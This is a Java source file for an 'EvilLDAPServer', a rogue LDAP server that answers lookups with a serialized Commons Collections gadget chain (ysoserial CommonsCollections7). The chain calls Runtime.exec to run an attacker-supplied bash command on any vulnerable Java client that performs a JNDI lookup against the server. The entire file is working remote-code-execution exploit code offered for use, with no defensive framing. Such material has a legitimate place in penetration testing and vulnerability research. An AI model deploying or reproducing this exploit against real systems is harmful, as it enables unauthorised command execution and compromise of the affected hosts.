/*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar:unboundid-ldapsdk-3.1.1.jar" EvilLDAPServer.java
 */
import java.io.*;
import java.util.*;
import java.lang.reflect.*;
import java.net.*;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class EvilLDAPServer
{
    /*
     * ysoserial/CommonsCollections7
     */
    @SuppressWarnings("unchecked")
    private static Object getObject ( String cmd ) throws Exception
    {
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( new Transformer[0] );
        Map             normalMap_0 = new HashMap();
        Map             normalMap_1 = new HashMap();
        Map             lazyMap_0   = LazyMap.decorate( normalMap_0, tchain );
        Map             lazyMap_1   = LazyMap.decorate( normalMap_1, tchain );
        lazyMap_0.put( "scz", "same" );
        lazyMap_1.put( "tDz", "same" );
        Hashtable       ht          = new Hashtable();
        ht.put( lazyMap_0, "value_0" );
        ht.put( lazyMap_1, "value_1" );
        lazyMap_1.remove( "scz" );
        Field           f           = ChainedTransformer.class.getDeclaredField( "iTransformers" );
        f.setAccessible( true );
        f.set( tchain, tarray );
        return( ht );
    }

    /*
     * com.sun.jndi.ldap.Obj.serializeObject
     */
    private static byte[] serializeObject ( Object obj ) throws Exception
    {
        ByteArrayOutputStream   bos = new ByteArrayOutputStream();
        ObjectOutputStream      oos = new ObjectOutputStream( bos );
        oos.writeObject( obj );
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor
    {
        String  cmd;

        public OperationInterceptor ( String cmd )
        {
            this.cmd    = cmd;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result )
        {
            String  base    = result.getRequest().getBaseDN();
            Entry   e       = new Entry( base );
            try
            {
                sendResult( result, base, e );
            }
            catch ( Exception ex )
            {
                ex.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception
        {
            e.addAttribute( "javaClassName", "foo" );
            e.addAttribute( "javaSerializedData", serializeObject( getObject( this.cmd ) ) );
            result.sendSearchEntry( e );
            result.setResult( new LDAPResult( 0, ResultCode.SUCCESS ) );
        }
    }

    private static void MiniLDAPServer ( String addr, int port, String cmd ) throws Exception
    {
        InMemoryDirectoryServerConfig   conf    = new InMemoryDirectoryServerConfig( "dc=evil,dc=com" );
        conf.setListenerConfigs
        (
            new InMemoryListenerConfig
            (
                "listen",
                InetAddress.getByName( addr ),
                Integer.valueOf( port ),
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                ( SSLSocketFactory )SSLSocketFactory.getDefault()
            )
        );
        conf.addInMemoryOperationInterceptor( new OperationInterceptor( cmd ) );
        InMemoryDirectoryServer         ds      = new InMemoryDirectoryServer( conf );
        ds.startListening();
    }

    public static void main ( String[] argv ) throws Exception
    {
        String  addr    = argv[0];
        int     port    = Integer.parseInt( argv[1] );
        String  cmd     = argv[2];
        MiniLDAPServer( addr, port, cmd );
    }
}
